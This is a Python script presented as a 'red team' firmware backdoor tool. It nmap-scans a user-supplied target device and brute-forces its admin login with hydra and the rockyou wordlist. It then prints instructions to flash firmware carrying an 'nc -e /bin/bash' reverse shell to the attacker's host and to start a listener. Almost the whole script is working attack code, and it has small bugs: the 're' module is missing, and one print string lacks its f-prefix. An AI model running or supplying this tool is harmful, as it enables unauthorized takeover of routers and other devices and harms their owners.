#!/usr/bin/env python3

import subprocess
import sys
import time
import os
import logging

FIRMPUNK_LOGO = """
   ███████╗██╗██████╗ ███╗   ███╗██████╗ ██╗   ██╗███╗   ██╗██╗  ██╗
   ██╔════╝██║██╔══██╗████╗ ████║██╔══██╗██║   ██║████╗  ██║██║ ██╔╝
   █████╗  ██║██████╔╝██╔████╔██║██████╔╝██║   ██║██╔██╗ ██║█████╔╝ 
   ██╔══╝  ██║██╔══██╗██║╚██╔╝██║██╔═══╝ ██║   ██║██║╚██╗██║██╔═██╗ 
   ██║     ██║██║  ██║██║ ╚═╝ ██║██║     ╚██████╔╝██║ ╚████║██║  ██╗
   ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝      ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═╝
   --------------------------------------------------------------------
      FIRMPUNK - Red Team Firmware Flasher | Backdoor Access | Kali
   --------------------------------------------------------------------
"""

logging.basicConfig(filename="firmpunk.log", level=logging.INFO, format="%(asctime)s | %(levelname)s | %(message)s")
logger = logging.getLogger("FirmPunk")

TARGET_IP = input("Enter target device IP: ").strip()
LHOST = input("Enter your public IP or hostname: ").strip()
LPORT = "4444"

def scan_device():
    try:
        logger.info(f"Scanning {TARGET_IP} for open ports...")
        result = subprocess.check_output(["nmap", "-p", "80,23", TARGET_IP], timeout=10).decode()
        if "80/open" in result or "23/open" in result:
            return True
        raise ValueError("No exploitable ports open")
    except Exception as e:
        logger.error(f"Scan failed: {e}")
        sys.exit(1)

def brute_force():
    try:
        logger.info(f"Brute-forcing {TARGET_IP}...")
        result = subprocess.run(["hydra", "-l", "admin", "-P", "/usr/share/wordlists/rockyou.txt", f"http-get://{TARGET_IP}"], capture_output=True, text=True)
        if "login" in result.stdout:
            creds = re.search(r"login:\s+(\S+)\s+password:\s+(\S+)", result.stdout)
            return creds.groups() if creds else ("admin", "password")
        return "admin", "password"  # Default guess
    except Exception as e:
        logger.error(f"Brute force failed: {e}")
        return "admin", "password"

def main():
    print(FIRMPUNK_LOGO)
    logger.info("FirmPunk initialized")
    
    if not scan_device():
        print("[!] No exploitable device found")
        sys.exit(1)
    
    username, password = brute_force()
    print(f"[!] Using creds - Username: {username}, Password: {password}")
    print("[!] Manual step: Flash firmware with backdoor (e.g., OpenWRT + nc -e /bin/bash {LHOST} {LPORT})")
    print("[!] Start listener: 'nc -lvp 4444' or Metasploit")
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        logger.info("User interrupted")
        sys.exit(0)

if __name__ == "__main__":
    main()